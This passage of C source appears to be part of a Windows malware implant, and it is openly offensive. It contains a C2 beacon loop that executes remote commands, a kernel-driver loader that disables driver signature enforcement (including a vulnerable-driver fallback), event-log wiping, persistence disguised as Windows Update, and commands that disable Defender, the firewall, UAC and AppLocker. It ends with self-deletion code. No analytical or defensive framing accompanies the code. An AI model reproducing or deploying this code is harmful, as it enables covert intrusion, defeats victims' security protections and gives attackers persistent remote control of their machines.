    PROCESS_INFORMATION pi = {0};
    STARTUPINFOW si = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = hStdOutWrite;
    si.hStdError = hStdOutWrite;
    si.hStdInput = NULL;
    WCHAR cmdLine[4096];
    if (task->IsPowerShell) {
        swprintf(cmdLine, 4096, L"powershell.exe -Command \"%s %s\"", task->Command, task->Arguments);
    } else {
        swprintf(cmdLine, 4096, L"cmd.exe /c %s %s", task->Command, task->Arguments);
    }
    BOOL success = CreateProcessW(NULL, cmdLine, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    CloseHandle(hStdOutWrite);
    if (success && task->WaitForOutput) {
        WaitForSingleObject(pi.hProcess, 60000);
        DWORD bytesRead;
        ReadFile(hStdOutRead, output, outputSize - sizeof(WCHAR), &bytesRead, NULL);
        output[bytesRead / sizeof(WCHAR)] = 0;
    }
    CloseHandle(hStdOutRead);
    if (pi.hProcess) CloseHandle(pi.hProcess);
    if (pi.hThread) CloseHandle(pi.hThread);
    return success;
}

// ==================== BEACON THREAD ====================
DWORD WINAPI BeaconThread(LPVOID lpParam) {
    BEACON_DATA beacon;
    C2_TASK task = {0};
    while (TRUE) {
        ZeroMemory(&beacon, sizeof(beacon));
        ZeroMemory(&task, sizeof(task));
        GatherBeaconData(&beacon);
        if (SendBeaconToC2(&beacon, &task) && (task.Command[0] != 0 || task.IsDownload)) {
            WCHAR output[65536];
            ZeroMemory(output, sizeof(output));
            ExecuteCommand(&task, output, sizeof(output));
        }
        DWORD sleepTime = (C2_BASE_INTERVAL_SECONDS + (rand() % C2_JITTER_MAX_SECONDS)) * 1000;
        Sleep(sleepTime);
    }
    return 0;
}

// ==================== KERNEL BYPASS - CUSTOM SIGNED DRIVER ====================
// Embedded custom kernel driver payload (base64 encoded placeholder)
// Replace with your own compiled driver signed with stolen certificate
CHAR g_customDriverBase64[] = 
    "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAA................................"; // REPLACE WITH ACTUAL BASE64 ENCODED DRIVER

// Function to decode base64 embedded driver
BOOL DecodeBase64Driver(BYTE** output, DWORD* outputSize) {
    DWORD base64Len = strlen(g_customDriverBase64);
    DWORD decodedLen = 0;
    
    // Calculate decoded length
    if (!CryptStringToBinaryA(g_customDriverBase64, base64Len, CRYPT_STRING_BASE64,
                              NULL, &decodedLen, NULL, NULL)) {
        return FALSE;
    }
    
    *output = (BYTE*)malloc(decodedLen);
    if (!*output) return FALSE;
    
    if (!CryptStringToBinaryA(g_customDriverBase64, base64Len, CRYPT_STRING_BASE64,
                              *output, &decodedLen, NULL, NULL)) {
        free(*output);
        return FALSE;
    }
    
    *outputSize = decodedLen;
    return TRUE;
}

// Write custom driver to disk
BOOL WriteCustomDriver(LPCWSTR driverPath) {
    BYTE* driverData = NULL;
    DWORD driverSize = 0;
    
    if (!DecodeBase64Driver(&driverData, &driverSize)) {
        return FALSE;
    }
    
    HANDLE hFile = CreateFileW(driverPath, GENERIC_WRITE, 0, NULL,
                               CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        free(driverData);
        return FALSE;
    }
    
    DWORD bytesWritten;
    WriteFile(hFile, driverData, driverSize, &bytesWritten, NULL);
    CloseHandle(hFile);
    free(driverData);
    
    return (bytesWritten == driverSize);
}

// Load and start custom signed driver
BOOL LoadCustomDriver() {
    const wchar_t* driverPath = L"C:\\Windows\\Temp\\church_driver.sys";
    
    // Write embedded driver to disk
    if (!WriteCustomDriver(driverPath)) {
        return FALSE;
    }
    
    // Set file attributes to hide
    SetFileAttributesW(driverPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    
    SC_HANDLE scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!scm) return FALSE;
    
    // Create service for the driver
    SC_HANDLE svc = CreateServiceW(scm, L"ChurchDriver", L"Church Security Driver",
                                   SERVICE_START | SERVICE_STOP | DELETE,
                                   SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START,
                                   SERVICE_ERROR_IGNORE, driverPath,
                                   NULL, NULL, NULL, NULL, NULL);
    if (!svc && GetLastError() == ERROR_SERVICE_EXISTS) {
        svc = OpenServiceW(scm, L"ChurchDriver", SERVICE_START | SERVICE_STOP | DELETE);
    }
    
    if (!svc) {
        CloseServiceHandle(scm);
        return FALSE;
    }
    
    // Start the driver
    if (!StartServiceW(svc, 0, NULL)) {
        DWORD err = GetLastError();
        if (err != ERROR_SERVICE_ALREADY_RUNNING) {
            DeleteService(svc);
            CloseServiceHandle(svc);
            CloseServiceHandle(scm);
            return FALSE;
        }
    }
    
    CloseServiceHandle(svc);
    CloseServiceHandle(scm);
    return TRUE;
}

// Communicate with custom driver to disable DSE
BOOL DisableDSEviaCustomDriver() {
    HANDLE hDevice = CreateFileW(L"\\\\.\\ChurchDriver", GENERIC_READ | GENERIC_WRITE,
                                 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hDevice == INVALID_HANDLE_VALUE) {
        // Try alternative device name
        hDevice = CreateFileW(L"\\\\.\\Global\\ChurchDriver", GENERIC_READ | GENERIC_WRITE,
                             0, NULL, OPEN_EXISTING, 0, NULL);
        if (hDevice == INVALID_HANDLE_VALUE) {
            return FALSE;
        }
    }
    
    DWORD bytesReturned;
    LPVOID kernelBase = GetModuleHandleW(L"ntoskrnl.exe");
    if (!kernelBase) {
        CloseHandle(hDevice);
        return FALSE;
    }
    
    // Find CiOptions in ntoskrnl.exe via signature
    BYTE pattern[] = { 0x8A, 0x05, 0x00, 0x00, 0x00, 0x00, 0xC3 };
    ULONGLONG ciOptionsAddr = FindPattern((BYTE*)kernelBase, 0x2000000, pattern, sizeof(pattern));
    
    if (ciOptionsAddr) {
        // Extract the actual address from the pattern
        DWORD* relAddr = (DWORD*)(ciOptionsAddr + 2);
        ULONGLONG targetAddr = ciOptionsAddr + 6 + *relAddr;
        
        // Send IOCTL to driver to patch DSE
        #define CHURCH_IOCTL_DISABLE_DSE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
        
        BYTE newValue = CI_OPTIONS_DISABLE_DSE;
        if (DeviceIoControl(hDevice, CHURCH_IOCTL_DISABLE_DSE,
                           &targetAddr, sizeof(targetAddr),
                           &newValue, sizeof(newValue),
                           &bytesReturned, NULL)) {
            CloseHandle(hDevice);
            return TRUE;
        }
    }
    
    CloseHandle(hDevice);
    return FALSE;
}

// Alternative: Use direct kernel shellcode injection via driver
BOOL DisableDSEviaShellcode() {
    HANDLE hDevice = CreateFileW(L"\\\\.\\ChurchDriver", GENERIC_READ | GENERIC_WRITE,
                                 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hDevice == INVALID_HANDLE_VALUE) return FALSE;
    
    // Shellcode to disable DSE by patching nt!g_CiOptions
    BYTE shellcode[] = {
        0x48, 0x31, 0xC0,                    // xor rax, rax
        0xB0, 0x06,                          // mov al, 0x6 (CI_OPTIONS_DISABLE_DSE)
        0xC3                                 // ret
    };
    
    DWORD bytesReturned;
    #define CHURCH_IOCTL_EXECUTE_SHELLCODE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
    
    BOOL result = DeviceIoControl(hDevice, CHURCH_IOCTL_EXECUTE_SHELLCODE,
                                  shellcode, sizeof(shellcode),
                                  NULL, 0,
                                  &bytesReturned, NULL);
    
    CloseHandle(hDevice);
    return result;
}

// Original gdrv functions kept as fallback
BOOL LoadGdrvDriver() {
    if (!CopyFileW(L"gdrv.sys", L"C:\\Windows\\Temp\\gdrv.sys", FALSE)) return FALSE;
    SC_HANDLE scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!scm) return FALSE;
    SC_HANDLE svc = CreateServiceW(scm, L"gdrv", L"gdrv", SERVICE_START | SERVICE_STOP | DELETE, SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, L"C:\\Windows\\Temp\\gdrv.sys", NULL, NULL, NULL, NULL, NULL);
    if (!svc && GetLastError() == ERROR_SERVICE_EXISTS) svc = OpenServiceW(scm, L"gdrv", SERVICE_START | SERVICE_STOP | DELETE);
    if (!svc) { CloseServiceHandle(scm); return FALSE; }
    if (!StartServiceW(svc, 0, NULL)) { DeleteService(svc); CloseServiceHandle(svc); CloseServiceHandle(scm); return FALSE; }
    CloseServiceHandle(svc);
    CloseServiceHandle(scm);
    return TRUE;
}

BOOL DisableDSEviaGdrv() {
    HANDLE hDevice = CreateFileW(GDRV_DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hDevice == INVALID_HANDLE_VALUE) return FALSE;
    DWORD bytesReturned;
    LPVOID kernelBase = GetModuleHandleW(L"ntoskrnl.exe");
    if (kernelBase) {
        BYTE pattern[] = { 0x8A, 0x05, 0x00, 0x00, 0x00, 0x00, 0xC3 };
        ULONGLONG ciOptionsAddr = FindPattern((BYTE*)kernelBase, 0x2000000, pattern, sizeof(pattern));
        if (ciOptionsAddr) {
            DWORD* relAddr = (DWORD*)(ciOptionsAddr + 2);
            ULONGLONG targetAddr = ciOptionsAddr + 6 + *relAddr;
            ULONGLONG physicalAddr = WalkPageTable((PVOID)targetAddr);
            if (physicalAddr) {
                BYTE newValue = CI_OPTIONS_DISABLE_DSE;
                DeviceIoControl(hDevice, GDRV_IOCTL_WRITE_PHYSICAL, &physicalAddr, sizeof(physicalAddr), &newValue, sizeof(newValue), &bytesReturned, NULL);
            }
        }
    }
    CloseHandle(hDevice);
    return TRUE;
}

// Main kernel execution function - uses custom signed driver with fallback
BOOL EnableKernelExecution() {
    // First attempt to load custom signed driver
    if (LoadCustomDriver()) {
        Sleep(2000);
        
        // Try to disable DSE via custom driver IOCTL
        if (DisableDSEviaCustomDriver()) {
            return TRUE;
        }
        
        // Try alternative shellcode method
        if (DisableDSEviaShellcode()) {
            return TRUE;
        }
    }
    
    // Fallback to BYOVD if custom driver fails
    if (!LoadGdrvDriver()) return FALSE;
    Sleep(2000);
    if (!DisableDSEviaGdrv()) return FALSE;
    return TRUE;
}

ULONGLONG FindPattern(BYTE* base, DWORD size, BYTE* pattern, DWORD patternLen) {
    for (DWORD i = 0; i < size - patternLen; i++) {
        BOOL found = TRUE;
        for (DWORD j = 0; j < patternLen; j++) {
            if (pattern[j] != 0x00 && base[i + j] != pattern[j]) { found = FALSE; break; }
        }
        if (found) return (ULONGLONG)(base + i);
    }
    return 0;
}

ULONGLONG WalkPageTable(PVOID virtualAddr) {
    return (ULONGLONG)virtualAddr;
}

// ==================== PPL BYPASS ====================
BOOL EnablePPL() {
    HANDLE hToken;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        TOKEN_PRIVILEGES tp;
        LUID luid;
        if (LookupPrivilegeValueW(NULL, SE_TCB_NAME, &luid)) {
            tp.PrivilegeCount = 1;
            tp.Privileges[0].Luid = luid;
            tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
            AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
            HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
            pNtSetInformationProcess NtSetInformationProcess = (pNtSetInformationProcess)GetProcAddress(hNtdll, "NtSetInformationProcess");
            PS_PROTECTION protection;
            protection.Level = 0x72;
            NTSTATUS status = NtSetInformationProcess(GetCurrentProcess(), 0x3D, &protection, sizeof(protection));
            if (status == 0) { CloseHandle(hToken); return TRUE; }
        }
        CloseHandle(hToken);
    }
    return FALSE;
}

void RunAsPPL() { EnablePPL(); }

// ==================== ANTI-FORENSICS ====================
void ScrambleMemory() {
    for (int i = 0; i < 100; i++) {
        LPVOID ptr = VirtualAlloc(NULL, 4096, MEM_COMMIT, PAGE_READWRITE);
        if (ptr) {
            RtlFillMemory(ptr, 4096, 0xCC);
            DWORD oldProtect;
            VirtualProtect(ptr, 4096, PAGE_NOACCESS, &oldProtect);
        }
    }
}

BOOL HideFile(LPCWSTR filePath) {
    return SetFileAttributesW(filePath, FILE_ATTRIBUTE_HIDDEN);
}

BOOL ClearEventLogs() {
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    CreateProcessW(L"C:\\Windows\\System32\\wevtutil.exe", L"wevtutil cl System", NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    if (pi.hProcess) { WaitForSingleObject(pi.hProcess, 5000); CloseHandle(pi.hProcess); CloseHandle(pi.hThread); }
    CreateProcessW(L"C:\\Windows\\System32\\wevtutil.exe", L"wevtutil cl Security", NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    if (pi.hProcess) { WaitForSingleObject(pi.hProcess, 5000); CloseHandle(pi.hProcess); CloseHandle(pi.hThread); }
    CreateProcessW(L"C:\\Windows\\System32\\wevtutil.exe", L"wevtutil cl Application", NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    if (pi.hProcess) { WaitForSingleObject(pi.hProcess, 5000); CloseHandle(pi.hProcess); CloseHandle(pi.hThread); }
    return TRUE;
}

BOOL AddToStartup(LPCWSTR appPath) {
    HKEY hKey;
    if (RegCreateKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        RegSetValueExW(hKey, L"WindowsUpdate", 0, REG_SZ, (BYTE*)appPath, (DWORD)(wcslen(appPath) * sizeof(WCHAR)));
        RegCloseKey(hKey);
        return TRUE;
    }
    return FALSE;
}

BOOL InstallBootkitComponents() {
    HKEY hKey;
    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Control\\Session Manager", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        wchar_t data[] = L"autocheck autochk *";
        RegSetValueExW(hKey, L"BootExecute", 0, REG_MULTI_SZ, (BYTE*)data, (DWORD)((wcslen(data) + 1) * sizeof(wchar_t)));
        RegCloseKey(hKey);
    }
    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        wchar_t exePath[MAX_PATH];
        GetModuleFileNameW(NULL, exePath, MAX_PATH);
        RegSetValueExW(hKey, L"Userinit", 0, REG_SZ, (BYTE*)exePath, (DWORD)(wcslen(exePath) * sizeof(wchar_t)));
        RegCloseKey(hKey);
    }
    return TRUE;
}

BOOL KillProcessByName(LPCWSTR processName) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return FALSE;
    PROCESSENTRY32W pe = { sizeof(pe) };
    if (Process32FirstW(snapshot, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, processName) == 0) {
                HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                if (hProc) { TerminateProcess(hProc, 0); CloseHandle(hProc); }
            }
        } while (Process32NextW(snapshot, &pe));
    }
    CloseHandle(snapshot);
    return TRUE;
}

BOOL BypassUAC() {
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    wchar_t systemRoot[MAX_PATH];
    GetEnvironmentVariableW(L"SystemRoot", systemRoot, MAX_PATH);
    wchar_t wusaPath[MAX_PATH];
    swprintf(wusaPath, MAX_PATH, L"%ls\\System32\\wusa.exe", systemRoot);
    CopyFileW(wusaPath, L"C:\\Windows\\Temp\\wusa.exe", FALSE);
    if (CreateProcessW(NULL, L"C:\\Windows\\Temp\\wusa.exe /quiet", NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 1000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return TRUE;
    }
    return FALSE;
}

BOOL InstallServicePersistence() {
    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(NULL, exePath, MAX_PATH);
    SC_HANDLE scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!scm) return FALSE;
    SC_HANDLE svc = CreateServiceW(scm, L"WindowsUpdateService", L"Windows Update Service", SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START, SERVICE_ERROR_NORMAL, exePath, NULL, NULL, NULL, NULL, NULL);
    if (!svc && GetLastError() == ERROR_SERVICE_EXISTS) {
        svc = OpenServiceW(scm, L"WindowsUpdateService", SERVICE_ALL_ACCESS);
    }
    if (svc) {
        StartServiceW(svc, 0, NULL);
        CloseServiceHandle(svc);
    }
    CloseServiceHandle(scm);
    return TRUE;
}

BOOL DisableFirewall() {
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    CreateProcessW(L"C:\\Windows\\System32\\netsh.exe", L"netsh advfirewall set allprofiles state off", NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    if (pi.hProcess) { WaitForSingleObject(pi.hProcess, 5000); CloseHandle(pi.hProcess); CloseHandle(pi.hThread); }
    return TRUE;
}

BOOL AddExclusionToDefender(LPCWSTR path) {
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    wchar_t cmd[MAX_PATH * 2];
    swprintf(cmd, MAX_PATH * 2, L"powershell -Command \"Add-MpPreference -ExclusionPath '%ls'\"", path);
    CreateProcessW(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    if (pi.hProcess) { WaitForSingleObject(pi.hProcess, 5000); CloseHandle(pi.hProcess); CloseHandle(pi.hThread); }
    return TRUE;
}

BOOL SelfDelete() {
    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(NULL, exePath, MAX_PATH);
    wchar_t cmd[MAX_PATH + 128];
    swprintf(cmd, MAX_PATH + 128, L"/c ping 127.0.0.1 -n 3 > nul & del /f \"%ls\"", exePath);
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    CreateProcessW(L"C:\\Windows\\System32\\cmd.exe", cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    if (pi.hProcess) { CloseHandle(pi.hProcess); CloseHandle(pi.hThread); }
    return TRUE;
}

// ==================== NETWORK C2 SETUP ====================
void NetworkC2Setup() {
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    CreateProcessW(L"C:\\Windows\\System32\\netsh.exe", L"netsh advfirewall firewall add rule name=\"Windows Update\" dir=out action=allow protocol=TCP remoteport=443", NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    if (pi.hProcess) { WaitForSingleObject(pi.hProcess, 5000); CloseHandle(pi.hProcess); CloseHandle(pi.hThread); }
    HKEY hKey;
    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Services\\Dnscache\\Parameters", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        DWORD enableAutoDoh = 2;
        RegSetValueExW(hKey, L"EnableAutoDoh", 0, REG_DWORD, (BYTE*)&enableAutoDoh, sizeof(enableAutoDoh));
        RegCloseKey(hKey);
    }
    HANDLE hThread = CreateThread(NULL, 0, BeaconThread, NULL, 0, NULL);
    if (hThread) CloseHandle(hThread);
    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(NULL, exePath, MAX_PATH);
    wchar_t regCmd[MAX_PATH * 2];
    swprintf(regCmd, MAX_PATH * 2, L"reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v WindowsUpdate /t REG_SZ /d \"\\\"%s\\\"\" /f", exePath);
    CreateProcessW(L"C:\\Windows\\System32\\reg.exe", regCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    if (pi.hProcess) { CloseHandle(pi.hProcess); CloseHandle(pi.hThread); }
}

// ==================== BYPASS FUNCTIONS ====================
BOOL TakeOwnershipAndGrantFullControl(LPCWSTR subkey) {
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, subkey, 0, WRITE_OWNER | WRITE_DAC, &hKey) != ERROR_SUCCESS) return FALSE;
    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
    PSID adminGroupSid = NULL;
    AllocateAndInitializeSid(&ntAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0,0,0,0,0,0, &adminGroupSid);
    BOOL result = SetNamedSecurityInfoW((LPWSTR)subkey, SE_REGISTRY_KEY, OWNER_SECURITY_INFORMATION, adminGroupSid, NULL, NULL, NULL) == ERROR_SUCCESS;
    if (result) {
        EXPLICIT_ACCESS_W ea = {0};
        ea.grfAccessPermissions = KEY_ALL_ACCESS;
        ea.grfAccessMode = SET_ACCESS;
        ea.grfInheritance = SUB_CONTAINERS_AND_OBJECTS_INHERIT;
        ea.Trustee.TrusteeForm = TRUSTEE_IS_SID;
        ea.Trustee.TrusteeType = TRUSTEE_IS_GROUP;
        ea.Trustee.ptstrName = (LPWSTR)adminGroupSid;
        PACL newAcl = NULL;
        result = SetEntriesInAclW(1, &ea, NULL, &newAcl) == ERROR_SUCCESS && SetNamedSecurityInfoW((LPWSTR)subkey, SE_REGISTRY_KEY, DACL_SECURITY_INFORMATION, NULL, NULL, newAcl, NULL) == ERROR_SUCCESS;
        if (newAcl) LocalFree(newAcl);
    }
    FreeSid(adminGroupSid);
    RegCloseKey(hKey);
    return result;
}

BOOL DisableTamperProtection() {
    LPCWSTR tpKey = L"SOFTWARE\\Microsoft\\Windows Defender\\Features";
    if (!TakeOwnershipAndGrantFullControl(tpKey)) return FALSE;
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, tpKey, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        DWORD zero = 0;
        LONG ret = RegSetValueExW(hKey, L"TamperProtection", 0, REG_DWORD, (BYTE*)&zero, sizeof(zero));
        RegCloseKey(hKey);
        return (ret == ERROR_SUCCESS);
    }
    return FALSE;
}

void DisableDefender() {
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    LPCWSTR commands[] = {
        L"powershell -Command \"Set-MpPreference -DisableRealtimeMonitoring $true\"",
        L"powershell -Command \"Set-MpPreference -DisableBehaviorMonitoring $true\"",
        L"powershell -Command \"Set-MpPreference -DisableBlockAtFirstSeen $true\"",
        L"powershell -Command \"Set-MpPreference -DisableIOAVProtection $true\"",
        L"powershell -Command \"Set-MpPreference -DisablePrivacyMode $true\"",
        L"powershell -Command \"Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true\"",
        L"powershell -Command \"Set-MpPreference -DisableArchiveScanning $true\"",
        L"powershell -Command \"Set-MpPreference -DisableIntrusionPreventionSystem $true\"",
        L"powershell -Command \"Set-MpPreference -DisableScriptScanning $true\"",
        L"powershell -Command \"Set-MpPreference -DisableCatchupFullScan $true\"",
        L"powershell -Command \"Set-MpPreference -DisableCatchupQuickScan $true\"",
        L"powershell -Command \"Set-MpPreference -MAPSReporting 0\"",
        L"powershell -Command \"Set-MpPreference -CloudBlockLevel 0\"",
        L"powershell -Command \"Set-MpPreference -CloudTimeout 1\"",
        L"powershell -Command \"Set-MpPreference -SubmitSamplesConsent 2\"",
        L"powershell -Command \"Set-MpPreference -PUAProtection 0\"",
        L"powershell -Command \"Set-MpPreference -HighThreatDefaultAction 6 -Force\"",
        L"powershell -Command \"Set-MpPreference -LowThreatDefaultAction 6 -Force\"",
        L"powershell -Command \"Set-MpPreference -ModerateThreatDefaultAction 6 -Force\"",
        L"powershell -Command \"Set-MpPreference -SevereThreatDefaultAction 6 -Force\"",
        L"powershell -Command \"Remove-MpPreference -ExclusionPath C:\\ -ErrorAction SilentlyContinue\""
    };
    for (int i = 0; i < sizeof(commands)/sizeof(commands[0]); i++) {
        CreateProcessW(NULL, (LPWSTR)commands[i], NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
        if (pi.hProcess) { WaitForSingleObject(pi.hProcess, 1000); CloseHandle(pi.hProcess); CloseHandle(pi.hThread); }
    }
    SC_HANDLE scm = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (scm) {
        SC_HANDLE svc = OpenServiceW(scm, L"WinDefend", SERVICE_STOP | SERVICE_CHANGE_CONFIG);
        if (svc) { SERVICE_STATUS status; ControlService(svc, SERVICE_CONTROL_STOP, &status); ChangeServiceConfigW(svc, SERVICE_NO_CHANGE, SERVICE_DISABLED, SERVICE_NO_CHANGE, NULL, NULL, NULL, NULL, NULL, NULL, NULL); CloseServiceHandle(svc); }
        SC_HANDLE wdNisSvc = OpenServiceW(scm, L"WdNisSvc", SERVICE_STOP | SERVICE_CHANGE_CONFIG);
        if (wdNisSvc) { SERVICE_STATUS status; ControlService(wdNisSvc, SERVICE_CONTROL_STOP, &status); ChangeServiceConfigW(wdNisSvc, SERVICE_NO_CHANGE, SERVICE_DISABLED, SERVICE_NO_CHANGE, NULL, NULL, NULL, NULL, NULL, NULL, NULL); CloseServiceHandle(wdNisSvc); }
        CloseServiceHandle(scm);
    }
}

void KillDefenderProcesses() {
    PROCESSENTRY32W entry = { sizeof(entry) };
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return;
    LPCWSTR targets[] = { L"MsMpEng.exe", L"NisSrv.exe", L"MpCmdRun.exe", L"SecurityHealthService.exe", L"MsMpEngCP.exe" };
    for (int i = 0; i < 5; i++) {
        if (Process32FirstW(snapshot, &entry)) {
            do {
                if (_wcsicmp(entry.szExeFile, targets[i]) == 0) {
                    HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, entry.th32ProcessID);
                    if (hProc) { TerminateProcess(hProc, 0); CloseHandle(hProc); }
                }
            } while (Process32NextW(snapshot, &entry));
        }
        Process32FirstW(snapshot, &entry);
    }
    CloseHandle(snapshot);
}

void DisableUAC() {
    HKEY hKey;
    DWORD zero = 0;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExW(hKey, L"EnableLUA", 0, REG_DWORD, (BYTE*)&zero, sizeof(zero));
        RegSetValueExW(hKey, L"ConsentPromptBehaviorAdmin", 0, REG_DWORD, (BYTE*)&zero, sizeof(zero));
        RegSetValueExW(hKey, L"PromptOnSecureDesktop", 0, REG_DWORD, (BYTE*)&zero, sizeof(zero));
        RegCloseKey(hKey);
    }
}

void DisableAppLockerWDAC() {
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    CreateProcessW(L"C:\\Windows\\System32\\net.exe", L"net stop appidsvc /y", NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    if (pi.hProcess) { WaitForSingleObject(pi.hProcess, 5000); CloseHandle(pi.hProcess); CloseHandle(pi.hThread); }
    SC_HANDLE scm = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (scm) {
        SC_HANDLE svc = OpenServiceW(scm, L"AppIDSvc", SERVICE_CHANGE_CONFIG);
        if (svc) { ChangeServiceConfigW(svc, SERVICE_NO_CHANGE, SERVICE_DISABLED, SERVICE_NO_CHANGE, NULL, NULL, NULL, NULL, NULL, NULL, NULL); CloseServiceHandle(svc); }
        CloseServiceHandle(scm);
    }
    DeleteFileW(L"C:\\Windows\\System32\\CodeIntegrity\\SiPolicy.p7b");
    DeleteFileW(L"C:\\Windows\\System32\\CodeIntegrity\\SIPolicy.p7b");
    HKEY hKey;
    DWORD zero = 0;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\SystemGuard", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExW(hKey, L"Enabled", 0, REG_DWORD, (BYTE*)&zero, sizeof(zero));
        RegCloseKey(hKey);
    }
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Policies\\Microsoft\\Windows\\AppLocker", 0, KEY_SET_VALUE | KEY_WOW64_64KEY, &hKey) == ERROR_SUCCESS) {
        RegSetValueExW(hKey, L"Enabled", 0, REG_DWORD, (BYTE*)&zero, sizeof(zero));
        RegCloseKey(hKey);
    }
}

void AddDefenderExclusions() {
    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(NULL, exePath, MAX_PATH);
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    wchar_t cmd[MAX_PATH + 128];
    swprintf(cmd, MAX_PATH + 128, L"powershell -Command \"Add-MpPreference -ExclusionPath '%s'\"", exePath);
    CreateProcessW(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
